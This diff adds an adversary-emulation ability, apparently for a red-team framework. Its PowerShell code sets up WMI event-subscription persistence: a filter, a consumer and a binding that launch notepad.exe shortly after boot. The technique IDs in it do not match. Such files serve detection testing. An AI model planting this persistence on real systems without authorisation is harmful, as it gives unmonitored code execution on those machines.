@@ -1,0 +1,39 @@
+---
+
+- id: c1cd6388-3ced-48c7-a511-0434c6baT1084
+  name: WMI Event Subscription
+  description: Windows Management Instrumentation (WMI) can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system
+  tactic: execution 
+  technique:
+    attack_id: T1078
+    name: Windows Management Instrumentation Event Subscription 
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          $wmiParams = @{
+          Computername=$env:COMPUTERNAME;
+          ErrorAction='Stop';
+          NameSpace='root\subscription';
+          };
+          $wmiParams.Class = "__EventFilter";
+          $wmiParams.Arguments = @{
+          Name = "ServiceFilterDslabs";
+          EventNamespace = "root\CIMV2";
+          QueryLanguage = "WQL";
+          Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
+          };
+          $filterResult = Set-WmiInstance @wmiParams;
+          $wmiParams.Class='CommandLineEventConsumer';
+          $wmiParams.Arguments = @{
+          Name='ServiceConsumerDslabs';
+          CommandLineTemplate="$($Env:SystemRoot)\System32\notepad.exe";
+          };
+          $consumerResult = Set-WmiInstance @wmiParams;
+          $wmiParams.Class='__FilterToConsumerBinding';
+          $wmiParams.Arguments = @{
+                  Filter = $filterResult;
+                  Consumer = $consumerResult;
+                  };
+          $bindingResult = Set-WmiInstance @wmiParams;
+
